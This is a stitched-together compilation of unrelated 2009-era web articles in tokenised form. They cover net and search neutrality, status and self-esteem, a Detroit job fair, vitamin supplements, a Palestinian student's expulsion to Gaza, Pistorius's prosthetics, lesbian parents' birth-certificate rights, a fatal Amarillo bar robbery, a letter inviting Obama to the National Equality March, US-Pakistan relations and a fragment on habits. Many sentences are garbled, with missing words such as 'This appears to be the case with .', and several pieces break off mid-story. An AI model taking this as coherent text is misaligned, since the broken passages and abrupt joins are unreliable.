The scheme that he envisioned was a basic bit of price discrimination ; charge extra fees to those who could afford to pay in order to maximize profits .
But here 's the thing — price discrimination happens all the time ( US college fees vary widely based on one 's ability to pay , for instance ) .
And while ISPs are one obvious chokepoint on the Internet , they are n't the only one .
Massive search engines like Google can easily become another , and it might not be long before the government needs to think about other forms of " neutrality . "
" Should something like net neutrality prevail , the conflict would likely move to a different level , " writes one of the leading US academics on Internet growth and economics .
" That level might become search neutrality . "
Or , as cloud computing takes off , one company ( again , this might well be Google ) could so completely dominate the market that it becomes another choke point .
We might then need to consider " cloud neutrality . "
Odlyzko 's paper ( PDF ) comes from a special issue of the Review of Network Economics earlier this year which was devoted to the topic of network neutrality .
Odlyzko himself is an internationally recognized expert on network economics who is based at the University of Minnesota and repeatedly puts the kibosh on the idea that networks are about to drown beneath some " exaflood " of data , or that network upgrades are truly expensive .
The special journal issue was put together by Phil Weiser , a tech law veteran who now has a senior job in the Obama Department of Justice , and who has involved himself in recent FCC panels related to the national broadband plan .
Point being : these ideas are being circulated by influential thought leaders and being read by those in a position to act on them .
Discrimination and profits
Odlyzko begins by noting that " from the standard economic point of view , there is nothing nefarious about attempting to introduce differential charging . "
The dream of most businesses is not to set a single price on an item , but to charge each customer the maximum amount that they are willing and able to pay .
This sort of information can be gleaned from all sorts of clues , but can cause extremely negative reactions when customers figure it out .
Imagine learning that Amazon was showing you a different price on all items than it showed to your neighbor because the company knows your purchase history and buying practices so well .
Actually , you do n't have to imagine — something like this happened in 2000 and spawned national headlines and a big backlash .
Fortunately for those who hate the idea , it 's often stunningly difficult to implement effectively .
As the paper notes , " Starbucks will not suddenly declare that the price of a cup of coffee will be $ 2 , $ 5 , or $ 7 , depending on how much Starbucks thinks a particular individual might be able and willing to pay , based on that person 's history of Starbucks purchases as well as income and assets , with a ' standard list price ' of $ 10 per cup for those who insist on remaining anonymous . "
The profit potential of such a role is gigantic .
But this sounds exactly like the dream of those into " behavioral targeting , " especially the sorts of targeting that rely on tracking Internet users as they browse the Web .
Knowing how often and when users visit particular types of pages can tell marketers all sorts of things ; someone who regularly visits a high - end jewelry site probably has more money than a Craigslist devotee .
What company is poised to own behavioral targeting ?
Google .
Any company that becomes the go - to source for consumer information and that controls the delivery of special offers , coupons , and discount advertisements " could potentially end up in control of product pricing , essentially relegating the good and service providers to a commodity role .
The profit potential of such a role is gigantic . "
In order to make this practice truly lucrative , though , a company like Google would need to have a neutral network connecting it to consumers .
Otherwise , as Google grows in power and popularity , " the communications network could grab profits by charging differential fees to Google that would absorb most of the benefits . "
Is " Google neutrality " next ?
Odlyzko 's view is that too much attention is paid to the ISPs ; the issue of differential pricing could well show up at many points of the Internet stack , along with similar consumer worries .
" The basic conclusion , " he writes , " is that whether AT&T or Google wins the net neutrality battle , the outcome ... may be similar , namely society exposed to the prospect of an unprecedented degree of discrimination .
It is doubtful that competition could mitigate the risks . "
The real question for deciding these issues is n't economic — it 's based instead on public discomfort with particular practices .
For instance , differential pricing is often applied to situations where a company can somehow determine when a product is valuable to consumers .
In the European mobile telephone market , making an international call is a good proxy for " importance " of that call .
Thus , despite the presence of robust competition , international roaming fees in Europe remain scandalously high .
The situation so outraged the public that the European Commission moved in 2007 simply to mandate that the telephone companies lower their fees .
In Odlyzko 's words , the tremendous fees " offended the public sense of fairness " — a tremendous business " no - no , " as the recent furor over bank bailouts and Wall Street reminds us .
Once the public was offended , the public ( through its representatives ) altered the rules of the marketplace .
Right now , the US public is offended about the idea of Internet price discrimination against content websites .
The issue raises concerns about democratic speech on the Internet ( which has proven to be a tremendous publishing platform for those who could never afford one before ) along with concerns about innovation ( how can the next Google get started in a garage when the network favors the deeply pocketed ? ) ; if those concerns win out , price discrimination of a certain sort might well be outlawed for ISPs , even as we allow it in all sorts of other social spaces .
And that inconsistency is n't necessarily bad ; it 's simply a reflection of a social sense of " fairness " written into regulation .
Odlyzko himself favors net neutrality — he just wants to make sure that people do n't get so starry - eyed about the virtues of regulating ISPs that they forget the same arguments might soon apply to other Internet choke points like cloud operators and search engines .
The paper concludes with a clarion call to government watchfulness : " For telecommunications , given current trends in demand and in rate and sources of innovation , it appears to be better for society not to tilt towards the operators , and instead stimulate innovation on the network by others by enforcing net neutrality .
But this would likely open the way for other players , such as Google , then emerge from that open and competitive arena as big winners , to become choke points .
So it would be wise to prepare to monitor what happens , and be ready to intervene by imposing neutrality rules on them when necessary . "
The government certainly has its eye on the mighty company .
The Department of Justice has already helped to scupper a proposed Google / Yahoo deal and opposed the first draft of Google 's book search settlement .

Brain research is doing two things .
In part it is explaining the underpinning functioning of things we already know , like the importance of mindfulness ( see last week 's post ) .
However , some research also points to the need for a major overhaul in our thinking .
This appears to be the case with .
While there 's no question that there 's a deep human drive for a feeling of self - esteem or competence , this feeling of competence is almost never assessed on it's own : we are social beings at the core , and as such our sense of competence appears to be deeply connected to others around us .
Self - esteem may not be an accurate way of understanding this feeling of ' okayness ' , when we actually measure this constantly against others .
Instead of self - esteem , we need to start thinking about the more dynamic sense of ' status ' .
Status means where are we positioned in relation to those around us : literally where we are in the ‘ pecking order ' .
Your perception of status , and any changes in it , can be a driver of what 's called primary reward or threat .
A sense of increasing status can be more rewarding than money , and a sense of decreasing status can feel like your life is in danger .
Here 's an excerpt from Your Brain at Work on this whole issue .
Maintaining the status quo
Status explains why people will queue for hours on a frosty morning to get a signed copy of a TV celebrity 's new book , ( a book they have no plan to read ) .
Status explains why people feel good meeting someone worse off than themselves , the German concept of " Schadenfreude " , with a study showing that reward circuits activate in this situation .
Status even explains why people love to win arguments , even pointless ones .
Status explains a tremendous number of strange occurances in life .
Status is relative , and a sense of reward from an increase in status can come anytime you feel " better than " another person .
Your brain maintains complex maps for the " pecking order " of the people surrounding you .
These maps have a similar structure to how you think about numbers .
Studies show that you create a representation of your own and someone else 's status in the brain when you communicate , which influences how you interact with others .
Changes in a pecking order brings about changes in how millions of neurons are connected .
If you have ever been in a relationship in which one partner unexpectedly begins earning more money than the other , you would have felt these wide - scale changes in brain circuitry take place , and the related challenges .
Organizations set up complex and well - defined hierarchies , and then try to motivate people with the promise of moving up within that hierarchy .
One company wo n't let you face your desk toward the window until you move from a " band 30 " to a " band 35 " role , even though you might sit next to a " band 35 " .
departments use two main levers to engage human emotions : , and the promise of increased status .
Despite attempts by corporations to make status about the size of your car or the cost of your watch , there 's no universal scale for status .
When you meet someone new and size up your relative importance , you might do so based on who is older , richer , stronger , smarter , or funnier .
( Or if you live in some Pacific Islands , based on who weighs more . )
Whatever framework you think is important , when your perceived sense of status goes up , or down , an intense emotional response results .
As a result , people go to tremendous extremes to increase or protect their status .
It operates at an individual and group level , and even at the level of countries .
The desire to increase status is behind many of society 's greatest achievements and some our darker hours of destruction .
On the way down
As with all emotional experiences , with status the threat response is stronger and more common than the reward response .
Just speaking to someone you perceive to be of a higher status , such as your boss , can activate a strong threat response .
A perceived threat to status feels like it could come with terrible consequences .
The response is visceral , including a flood of cortisol to the blood and a rush of resources to the limbic system that inhibits clear thinking .
Naomi Eisenberger , a leading social researcher at UCLA , wanted to understand what goes on in the brain when people feel rejected by others .
She designed an experiment that used fMRI to scan the brains of participants as they played a computer game called " Cyberball . "
Cyberball harks back to the nastiness of the school playground .
" People thought they were playing a ball tossing game over the Internet with two other people , " Eisenberger explained during an interview down the road from her lab .
" They could see an avatar that represented them , and avatars for two other people .
Then , about half way through this game of toss between the three of them , they stop receiving the ball and the other players throw the ball only to each other . "
This experiment generates intense emotions for most people .
Eisenberger says , " What we found is that when people were excluded , you see activity in the dorsal portion of the anterior cingulate cortex , which is the neural region that 's also involved in the distressing component of pain , or what sometimes people call the " suffering component " of pain .
Those people who felt the most rejected had the highest levels of activity in this region . "
Exclusion and rejection is physiologically painful .
A feeling of being less than other people , activates the same brain regions as physical pain .
Eisenberger 's study showed five different physical - pain brain regions lighting up under this social - pain experiment .
Social pain can be as painful as physical pain , as the two appear synonymous in the brain .
The real trouble with feedback
Think of the drop in your stomach when someone says to you , " Can I give you some feedback ? "
It 's a similar feeling to walking alone at night and sensing that someone is about to attack you from behind : perhaps not as intense but it 's the same fear response .
This discovery about the brain explains why people sometimes react with the human equivalent of a dog baring its teeth and growling when you tell them they 've done something wrong : their brain thinks someone is about to hit them .
Because of the intensity of the status - drop experience , people go to great lengths to avoid situations that might risk their sense of status .
This includes staying away from any activity they are not confident in , which , because of the brain 's relationship to novelty , can mean avoid anything new , impacting quality of life .
The threat response from a perceived drop in status can take on a life of its own , lasting for years .
People work hard to avoid being " wrong " in a situation , from a simple typesetting mistake , to an error of judgment about a major strategy .
Think of some of the big corporate mergers that have gone bad , and the executives involved avoiding any responsibility .
People do n't like to be wrong because being wrong drops your status , in a way that feels dangerous and unnerving .
When you decide you are right , the other person must be wrong , which means you do n't listen to what he or she says , and he or she experiences you as a threat too .
A vicious cycle emerges .
Being " right " is often more important to people than , well , than just about anything else , at the cost of not just money but relationships , health , and sometimes even life itself .
As well as sometimes taking on a life of its own , the other trouble with status threats is how easily they can occur , generating a strong threat even in minor situations .
Say you are at a meeting with a colleague , and for the first time in your working relationship , he asks to follow up with you about a project .
It 's likely you will interpret his request as a threat to your status :
Does n't he trust you ?
Is he checking up on you ?
Your threat response could make you say something harmful to your .
Remember that the limbic system once aroused makes accidental connections and thinks pessimistically .
Just speaking to your boss arouses a threat .
If you manage someone , just asking how his or her day is going can carry more emotional weight than one might think .
I propose that many of the arguments and conflicts at work , and in life , have status issues at their core .
The more you can label status threats as they occur , in real time , the easier it will be to respond more appropriately .
On the way up
I interviewed an international ballet dancer who used to be a member of the London Royal Ballet .
She told me how she was often bored and frustrated as one of many dancers , even though she was in a world - class troupe .
That all changed when she moved to a smaller , less known , troupe in her home city , but now was the leading soloist .
She explained , " Finally I am the highest paid dancer in the company .
I am the one at the front of the room .
The minute you 're at the front of the room , there 's no boredom at all .
The focus is on you , the space is your space , you feel at the top . "
Studies of primate communities show that higher status monkeys have reduced day - to - day cortisol levels , are healthier , and live longer .
This is n't just monkey business ( sorry for the pun . )
There is an entire book , The Status Syndrome by Michael Marmot , illustrating that status is a significant determinant of human longevity , even controlling for and income .
High status does n't just feel good .
It brings along very real rewards , too .
Status is rewarding not just when you have achieved high status , but also anytime you feel like your status has increased , even in a small way .
One study showed that saying to kids " good job " in a monotonous recorded voice activated the reward circuitry in kids as much as a financial windfall .
Even little status increases , like beating someone at a card game , feel great .
We 're wired to feel rewarded by just about any incremental increase in status .
Many of the world 's great narratives ( and some of our not so great television franchises ) have status at their core , based on two recurring themes .
These stories involve either ordinary people doing extraordinary things ( giving you hope you could have higher status one day ) or extraordinary people doing ordinary things ( giving you hope that even though may be ordinary , you are basically the same as people with high status . )
Even an increase in hope that your status might go up one day seems to pack a reward .
An increase in status is one of the world 's greatest feelings .
and serotonin levels go up , linked to feeling happier , and cortisol levels go down , a marker of lower .
levels go up too .
Testosterone helps people focus , feel strong and confident , and even improves drive .
With more dopamine and other " happy " neurochemicals , an increase in status increases the number of new connections made per hour in the brain .
This means that a feeling of high status helps you process more information , including more subtle ideas , with less effort .
With the reduced threat response , you are more able to think on multiple levels at once .
People with higher status are better able to follow through with their intentions more - they have more control , more support , and more from others .
Being in a high - status state helps you make the connections that your brain expects to make , which puts you in an upward spiral toward even more positive neurochemistry .
This may well be the neurochemistry of " getting on a roll . "
Getting and staying on a high
You can elevate your status by finding a way to feel smarter / funnier / healthier / richer / more righteous / more organized / fitter / stronger or by beating other people at just about anything at all .
The key is to find a " niche " where you feel you are " above " others .
If you video recorded a standard weekly team meeting in most organizations , you might find that a large percentage of the words spoken every are intended to edge an individual 's status higher , or edge other people 's status lower .
This bickering , the corporate equivalent of rivalry , largely happens unconsciously and wastes the cognitive resources of billions of people .
The ongoing fight for status has other downsides .
While can make people focus , there 's will always be losers in a status war .
It 's a zero sum game .
If everyone is fighting for high status , they are likely to feel competitive , to see the other person as a threat .
If you want to have a potentially threatening conversation with someone , try talking down your own performance to help put the other person at ease .
Another strategy for managing status is to help someone else feel that his or her status has gone up .
Giving people positive feedback , pointing out what they do well , gives others a sense of increasing status , especially when done publicly .
The trouble is , giving others people positive feedback may feel like a threat , because of a sense of a relative change in status .
This may explain why , despite employees universally asking for more positive feedback , employers seem to prefer the " deficit model " , pointing out people 's faults and performance gaps , over a strengths - based approach .
These two strategies — putting your status down and others ' up - only help other people with their status , and may actually threaten yours .
So where can you get a nice burst of - inducing , - boosting , performance - raising status around here , without harming children , animals , work colleagues or yourself ?
Getting a status - rush without harming others ' status
There 's only one good ( non-pharmaceutical ) answer that I can find so far .
It involves the idea of " playing against yourself . "
Why does improving your golf handicap feel so good ?
Because you raise your status against someone else , someone you know well .
That someone is your former self .
" Your sense of self comes online around the same time in life when you have sense of others .
They are two sides of same coin , " Marco Iacoboni explains .
Thinking about yourself and thinking about others use the same circuits .
You can harness the power of the thrill of " beating the other guy " by making that other guy ( or girl ) you , without hurting anyone in the process .
To play against yourself gives you the chance to feel ever - increasing status , without threatening others .
I have a hunch that many successful people have worked all this out and play against themselves a lot .
In summary — I think it 's time we rethink self - esteem .
Status appears to be a more accurate way of thinking about what self esteem is really about .
It 's a highly dynamic issue .
By rethinking self - esteem we can create more accurate ways of intervening with those struggling with low status , like changing one 's environment , or finding domains of life where one can experience higher status , or learning to play against yourself .

Detroit job fair draws thousands
By Naomi Spencer
14 November 2009
Thousands of Detroit area residents lined up downtown Friday at a jobs fair , waiting in long lines to apply for some 400 positions .
The event was moved to the Cobo Hall conference center after organizers recognized that the potential size of the fair would far exceed space at the city ’s Work Place Building , the originally scheduled location .
Yet another indication of the deepening economic crisis in the region , the jobs fair is the latest in a series of jobs and assistance events that have drawn large crowds to Cobo Hall this year .
In March , the city sponsored a similar job fair , which attracted as many as 10,000 residents .
Last month , as many as 50,000 residents turned out to try to secure heating aid intended to serve only 3,400 people .
The city ’s population is confronted by increasingly dire employment prospects .
Presently the official unemployment rate in Detroit stands at 28.9 percent , and more than a third of the population lives in poverty .
These depression - level conditions have driven thousands to desperately seek out any means of financial subsistence .
Officials from the Detroit Workforce Development Department , Neighborhood Legal Services Michigan , and Mayor David Bing ’s office told the WSWS the fair was a joint effort to create job opportunities in Detroit .
Mark Jones , a spokesman for the joint operation , said the fair was “ the fulfillment of the commitment of Mayor Bing to bring jobs to Detroit . ”
Far from “ bringing jobs to Detroit , ” Bing has spearheaded an assault on teachers and city workers , while presiding over the continued economic collapse of the city .
People looking for work were frustrated that the event had been billed as a fair where employers would be accepting resumes and interviewing for positions .
Once they got through the long lines , however , job seekers were told to simply apply online and given web addresses .
Most of the jobs advertised at the fair were for low - wage service jobs .
Wal - Mart offered 300 job openings , which applicants told WSWS reporters were mainly entry - level part - time and temporary work ( see accompanying video ) .
“ It ’s a waste of time , ” Movita Gresham told WSWS reporters as she exited the conference hall .
“ I have a masters degree and am overqualified for most of those positions .
I need work , but ‘ Go online , ’ that ’s all they have for us .
It ’s a waste of time . ”
Freddie Kelley
A representative for Kmart told the WSWS that the company was offering only part - time , seasonal work ―stocking shelves at night , manning customer service during the holiday season , and running registers .
While the company was advertising only 20 to 40 positions , the representative estimated they would receive between 3,000 and 4,000 applications .
The WSWS spoke to Freddie Kelley , who said he had recently been released from jail and found it extraordinarily difficult to secure work .
“ I think Obama should create more jobs .
To find openings you have to fill out a lot of applications online , and I do n’t know a lot about computers .
I ’ve been looking for work for a month .
I have a job interview with a temp service , but I ’ve applied at Wal - Mart , Kmart , Farmer Jack ’s , all the fast food chains , and got nothing .
I ’m in skilled trades , in welding , but there ’s no work .
I have to feed my family . ”
Anthony Screen
Anthony Screen told the WSWS , “ The government can bail out the banks with $ 23 trillion .
Look , are there 23 trillion people in the United States ?
They could give every single one of us a million dollars .
What they ’re doing does n’t make any sense .
You ca n’t find balance in the economy by cutting people 's jobs . ”
Dwayne Harris , who ’s on probation for a nonviolent offense , expressed frustration over applying for numerous jobs .
“ I ’ve been out of work now for one - and - a - half years .
I worked at security jobs around , but there are n’t a lot of jobs out there . ”
Dwayne added , “ I went to apply at a Popeye ’s Chicken and the manager told me , ‘ We have hired everybody we can hire , and we ’d rather hire high school kids so we can lower the wages . ’ ”
Ryan Haire
Ryan Haire , a 20 - year - old unemployed Taylor man , recently moved to the area from Kentucky in search of work .
He told the WSWS that of the employer tables he had visited , perhaps five companies were actually hiring .
Most were merely handing out web addresses .
“ I ’ve been looking for work since March .
I want to go to college , ” he said , “ but I ’m afraid I ’ll just come out with a lot of debt and still not be able to find a job . ”
Ryan Caruso , 23 , of Canton , said he had recently filled out 20 applications , most of them in person , but was told no position was available for his skill set .
He expressed exasperation at the fact that the fair had been billed as an event where job seekers could apply on the spot .
“ It ’s a joke , ” he said .
“ People get all dressed up and come down here , wait in line , and are handed a sticker with a web site on it . ”

Unless you have particular dietary needs , vitamin supplements are probably a waste of money and may even be harmful , a nutritionist told a meeting at the British Science Festival
Some of us would n't dream of starting the day without imbibing a carefully considered combination of vitamins , minerals and biochemical supplements .
These are taken safe in the knowledge ( or delusion ? ) that we will benefit from good health , longer life and a general feeling of wellbeing .
Speaking yesterday at the British Science Festival , Professor Brian Ratcliffe of Robert Gordon University in Aberdeen argued that most people should simply consume a varied diet containing a number of different vitamins and minerals .
The large number of " worried well " in the UK who take supplements with a " better safe than sorry " attitude are wasting their money while feeding the multi-billion - pound vitamin industry .
Take vitamin C. Despite very little clinical evidence supporting beneficial effects of consuming ultra- high doses of vitamin C , these supplements have become popular for " warding off colds " and other infections .
Supplements that contain 1.5g of vitamin C ( the equivalent of more than 20 oranges ) per dose are widely available .
But around 75 % of the vitamin ends up down the toilet , said Professor Ratcliffe .
Our kidneys simply remove it from the bloodstream .
If you are under 65 and worried about your nutrition he suggests you would be better off visiting a dietician before buying expensive multi-vitamin complexes .
There is also a wealth of information available online .
Vitamin supplements do have a role to play for certain groups , he said .
For example folic acid is recommended during pregnancy , and over - 65s are at risk from vitamin D deficiencies .
On the flipside , some groups are at risk from higher dosages of particular vitamins .
Recent research suggests vitamin E supplements can be harmful to smokers .
Presenting his work in collaboration with the Nutrition Society , Professor Ratcliffe argued that research has clearly established at what level we become deficient in a particular vitamin – and the level ( if any ) at which a vitamin becomes toxic – but has failed to establish with confidence how much of a certain vitamin we should take for " optimum " health effects .
He said the health benefits of a particular vitamin tend to increase as intake rises above an established minimum until an optimum is reached , past which there is no extra benefit and in some cases there is harm .
The optimum level varies according to sex , age and many other factors , making it impossible to give an ideal dose that would be suitable for everyone .
• This article was amended on 17 September 2009 .
We said recent research suggests vitamin A supplements can be harmful to smokers : in fact the research we meant is about vitamin E .
This has been corrected .
A Palestinian student has been handcuffed , blindfolded and forcibly expelled to the Gaza Strip by Israeli troops just two months before she was due to graduate from university .
Berlanty Azzam , 21 , who was studying for a business degree at Bethlehem University , said she was coming home in a shared taxi from a job interview in Ramallah on Wednesday when soldiers at the " Container " checkpoint took her identity card and that of another passenger with a Gaza address .
After six hours of waiting , soldiers told her she would be taken to a detention centre in the southern West Bank , and she was handcuffed and blindfolded , she said .
Download the new Independent Premium app Sharing the full story , not just the headlines
" The driving took longer than it should have and I started to think something was wrong .
I started to wonder , what are they doing to me ? "
After the car stopped and the blindfold was lifted , Ms Azzam saw she was at the Erez crossing to Gaza .
It was the sixth known forced return to Gaza of Palestinians stopped at the " Container " checkpoint – which is between Bethlehem and Abu Dis – in 10 days , according to the Israeli human rights group Gisha .
Israel has also been preventing family reunifications in the West Bank for Palestinians with relatives living in Gaza , in effect forcing people to relocate to the Strip .
The steps are part of an Israeli policy of treating Gaza and the West Bank as two separate entities , thereby undermining the coherence of Palestinian claims for a state encompassing both territories .
The 1993 Oslo agreement stipulates that the West Bank and Gaza Strip are to be treated as one territorial unit .
Major Guy Inbar , an Israeli defense ministry official , said the reason for Ms Azzam 's deportation was that she was " staying illegally " in the West Bank .
" We are talking about a Gaza citizen who requested permission to study in the area of Judea and Samaria and received a negative answer , " he said .
" In 2005 , she was given a permit to visit Jerusalem for four days and she remained afterwards [ in the West Bank ] without any permit .
Her entire period as a student was based on deceit and was against the law . "
Sari Bashi , head of the Israeli Gisha human rights group , who tried to intervene on Ms Azzam 's behalf , said she was assured by military lawyers on Wednesday that the student would not be deported to Gaza and that the rights group could seek a judicial review in the morning .
" The military misled us , " Ms Bashi said .
" There is a violation here of the right to access education , the right to freedom of movement and the right to choose one 's place of residence within one 's own territory . "
The army did not respond to a request for comment .
Brother Jack Curran , vice president for development of Bethlehem University , termed the expulsion " a disgrace " .
" This is not about politics .
It 's about a young person finishing her degree .
Since 2005 she has been studying as a good student .
No one is a winner from this . "
South African track runner Oscar Pistorius , though not a double amputee — he was born without lower legs — has enjoyed great success competing in that class wearing state - of - the - art carbon - fiber prosthetics .
After setting world records in the 100 , 200 , and 400 meters , he sought to move up in weight class , if you will .
Initially , he was prohibited from competing against able - bodied runners on the grounds that , because they were a little too state - of - the - art , his prosthetics gave him an unfair advantage .
( Of course , he was still allowed to crush other double - amputees . )
Ultimately , though , he was cleared to compete against all runners .
But the unfair - advantage issue is not a closed book .
At Sports Illustrated , David Epstein writes about a report in the Journal of Allied Physiology , in which two of the seven scientists belonging to the group that cleared Pistorius “ now say that the so - called ‘ Cheetah ’ legs make Pistorius 10 seconds faster over 400 meters than he otherwise would be , a boost so significant as to make the difference between a mediocre high school runner and an Olympian . ”
One ’s first impulse is to think the advantage would be derived from his newfound ability to bound gazelle - like around the track .
However , writes Epstein :
The researchers found that because the carbon fiber Cheetahs are about half the weigh .
. . . of an able - bodied sprinter ’s lower leg , Pistorius can swing his lower leg through the air between strides 15.7 percent more quickly [ than an ] average of five former 100 - meter world record holders .
“ Oscar is off the charts , ” said Peter Weyand , one of the researchers and an exercise physiologist at Southern Methodist University .
“ Clearly , with athletes with intact limbs , there ’s a lower limit to how fast they can reposition their limbs . ”
In fact , Weyand and the report ’s co-author Matthew Bundle ( emphasis added ) “ concluded that Pistorius has the highest stride frequency ever recorded because of how quickly the lightweight Cheetahs allow him to whip his legs through the air . ”
That also affords him , writes Epstein , “ the liberty of spending more time with the foot of each Cheetah on the ground , generating force all the while . ”
All told , said Weyand : “ The muscular forces he has to generate are less than half of what an intact sprinter has to generate to go the same speed . ”
In fact , if you watch Pistorius run ( this video is just 10 seconds long ) , you ’ll see that far from covering ground with great leaps and bounds while wearing the Cheetahs , his running style is earth - bound to the point of dead - legged .
In other words , Pistorius ’s advantage is totally predicated on stride frequency , or what they refer to in track and field as “ turnover . ”
Stride length , Usain Bolt notwithstanding , is apparently of little significance .
Think of the trundling style of the great Michael Johnson , for instance , who ran the same distances as Pistorius .
Running technique aside , his case shares some similarities with that of hermaphrodite 800 - meter runner Caster Semenya , also from South Africa , who was recently allowed to keep her Olympic gold medal despite lingering questions about her sexual identity .
As Epstein wrote in an article on Ms. Semanya , a “ professor of obstetrics , gynecology and molecular genetics , likened [ her situation ] to calling unfair a pituitary tumor that causes someone to grow to be 7 - foot - 5 and play in the NBA . ”
The case could be made that the efficiency of the prosthetics Pistorius is allowed to use should be governed .
After all , the number of spikes allowed in a track shoe is limited .
But , since we ’re dealing with the disabled , that would seem churlish .
In fact , is it too much to ask athletes poised to compete against Pistorius to act with maturity and learn to live with the situation ?
After all , like Ms. Semenya , Pistorius is an anomaly .
Unless , of course , runners care to arrange an accident that results in the amputation of their lower legs .
Then they , too , can obtain space - age prosthetics and become even more bionic than Pistorius .

Rosalind and Eve Carlile have both welcomed the new legislation
The news that lesbian couples in England and Wales who start a family through fertility treatment can now place both their names on the birth certificate has been welcomed by a gay couple with children .
Eve Carlile describes the move as " practically really helpful , and ideologically great " .
The 33 - year - old lives with her partner Rosalind Carlile , 34 , in Scunthorpe with their two boys , aged four and one .
The two adults have been together for 12 years and in a civil partnership for the last three .
Both their children were conceived by Rosalind using an anonymous sperm donor .
" It 's brilliant that women in our situation will have full legal rights for the co-parent from the beginning , " Eve said .
" It 's fantastically good news .
" We did n't conceive our children together , but we did conceive of them .
" Hopefully it will have a positive effect on society 's view of lesbian and gay people , because the government are basically saying that we 're OK , and perhaps people who are not gay will begin to think the same . "
The media coverage will help get the point across that our lifestyle is ' normal ' , for want of a better word , and nothing to get excited about
Eve Carlile
Equal birth rights for lesbians
The new law only counts for women receiving fertility treatment on or after 6 April of this year .
For women like Eve , this means that she has to adopt the children , and she has begun that procedure .
" It 's a little bit farcical , because we have to be seen by a social worker who has to take time away from children who are at risk to examine my case , " she said .
" I 'm not a step - parent but I 'm regarded as such in the adoption process .
Understandably , the social workers put cases like ours at the bottom of their list .
" While I 'm pleased that this new law has come in for couples in the future , it 's a shame that it wo n't have a positive effect on people like us , that it wo n't mean our case will be fast - tracked or anything . "
Parental recognition
Eve also said the new law " cannot be anything other than a good thing " in the advancement of gay issues among public opinion .
" The media coverage will help get the point across that our lifestyle is ' normal ' , for want of a better word , and nothing to get excited about .
" But I do n't think many people are homophobic about our type of family .
Certainly we 've never experienced any homophobia , at school or in church , anywhere .
" The new law means that as the children attend school and hospital , a woman in my situation can say that she is the other parent . "
Rosalind echoes her partner 's sentiment , saying the previous circumstances have been " such a pain " .
She added : " This whole adoption procedure is going to be long and drawn out and it's a waste time and resources .
" Unfortunately it would be an administrative nightmare for the government to go back and apply the law retrospectively , but you would think they would fast - track cases such as ours , for people who have had fertility treatment in the last few years . "

Last moments of shot British tourist who stopped off in Amarillo ' because he liked the Tony Christie song '
A Texas bar owner told last night of the final moments of a British tourist shot dead by a robber .
Faith Morin spoke as police released dramatic CCTV pictures of the attack in which 28 - year - old Thomas Reeve died .
One shows the killer , Ray Cisneros , holding a gun to the head of a terrified woman after forcing her to open the till .
Footage from the robbery which left a British tourist dead clearly shows the gunman threatening a worker
A gun is pointed at the bar worker 's head where Thomas Reeve was drinking
Mr Reeve , the father of a one - year - old girl called Tabitha , was on a month - long road trip from San Francisco to Florida with two friends , a woman identified as Laura Hain and a man who has not been named .
They decided to stop in Amarillo , Texas , because of the hit song ' Is this the way to Amarillo ? ' .
They went to the bar , the Spotted Pony , on Thursday night only because it was the nearest to their motel .
A group of drinkers huddle on the floor as the gunman opens fire in the bar
Mr Reeve can been seen in green in the background drinking coke with friends
Owner Faith Morin , 26 , told how Cisneros burst in and fired a shot into the ceiling .
She said : ' He screamed at everyone to get on the floor .
Tragic tourist : Thomas Reeve , pictured with daughter , was killed when shots were fired at several drinkers
There were about 15 people in the bar and they did as he said .
No one gave him any trouble .
' He fired a shot and hit one of our regulars in the hand , and then headed over to where Thomas and his friends were sitting .
' His female friend held out her purse for him to take it , but he fired his gun . '
Mrs Morin said the bullet ricocheted off a table and into Mr Reeve 's chest .
Cisneros , 25 , callously left him dying on the floor while he continued to grab money from drinkers and empty the till .
She added : ' Everyone was too frightened to move . '
The gunman then forced a customer to open the till , hitting her on the head with his gun when she initially pressed the wrong buttons .
Cisneros also made a 28 - year - old woman take off her clothes and sexually assaulted her before running outside .
Mrs Morin , who has owned the bar for
Suspect : Ray Carlos Cisneros
only six months , said : ' This was just a senseless killing .
I feel sick to my stomach that someone has lost their life over a few hundred dollars . '
She also revealed that Mr Reeve , from Maidenhead , Berkshire , was only drinking cola .
He had wanted to leave the bar earlier , because he was tired after a long drive , but was persuaded to stay .
Police arrested Cisneros after a 19 - hour manhunt .
He has been charged with murder and could face the death penalty .
Mr Reeve 's devastated mother Margaret , 58 , said at her home in Maidenhead : ' You just do n't expect to hear that your child has been shot and killed , not on holiday .
' He only went to Amarillo because of the song .
LGBT activist and event organizer Cleve Jones has officially invited President Obama to attend the National Equality March in DC on October 10 - 11 .
Jones ’ letter below :
Dear President Obama :
Thank you for honoring Harvey Milk with the Medal of Freedom Award .
Harvey was my friend and teacher .
In the 30 years since he was assassinated lesbian , gay , bisexual , and transgender people have attained a handful of rights in a handful of states , but we are still second - class citizens .
Your historic election gave us hope that change can happen , and now tens of thousands of LGBT people , along with our straight allies , are taking action to demand it .
On October 11 we will march on Washington in support of a single goal : full and equal protection for LGBT people in all matters governed by civil law in all 50 states .
Equal rights are not a “ gay ” issue .
They are about our shared human rights : safety in our schools and jobs , equitable healthcare and housing , and protection for our families , to name a few .
I compare our National Equality March with the Civil Rights March of 1963 .
Martin Luther King had a dream ; we have a dream too .
We share Dr. King ’s belief in the dignity and equality of all peoples , and his commitment to non-violence .
And we share his faith that justice will prevail .
We do not expect to achieve our goal overnight .
Our struggle for equality has taken many years , and much hard work remains ahead .
The nation is preoccupied with economic hardship and war .
But you have given us hope that civil rights remain on this nation ’s agenda .
The time is right for us to call on our fellow Americans , our elected leaders , and you to reaffirm our shared commitment to civil rights .
With hope in our hearts , we invite you to join us on the west lawn of the Capitol on October 11th .
We ask you to take the microphone and renew our faith that Washington will work with us , and not against us .
We urge you to remind the world that we are welcome members of this nation .
We invite you to stand with us in pride .
Sincerely ,
Cleve Jones
Co-Chair , National Equality March
ISLAMABAD , Pakistan 
The Obama administration is putting pressure on Pakistan to eliminate Taliban and Qaeda militants from the country ’s tribal areas , but the push is straining the delicate relations between the allies , Pakistani and Western officials say .
The Pakistani military ’s recent heavy offensive in South Waziristan has pleased the Americans , but it left large parts of Pakistan under siege , as militants once sequestered in the country ’s tribal areas take their war to Pakistan ’s cities .
Many Pakistanis blame the United States for the country ’s rising instability .
When Secretary of State Hillary Rodham Clinton arrives in Pakistan this week , as she is scheduled to do , she will find a nuclear - armed state consumed by doubts about the value of the alliance with the United States and resentful of ever - rising American demands to do more , the officials said .
The United States is also struggling to address Pakistan ’s concerns over the conditions imposed on a new American aid package of $ 7.5 billion over five years that the Pakistani military denounced as designed to interfere in the country ’s internal affairs .
Habits are a very precious asset .
They allow us to drive cars or ride a bike , to speak new languages or to predictably behave in society .
But they can also become a burden .
Or , even worse , an addiction .
Think about smoking and you ’ll understand what I mean .
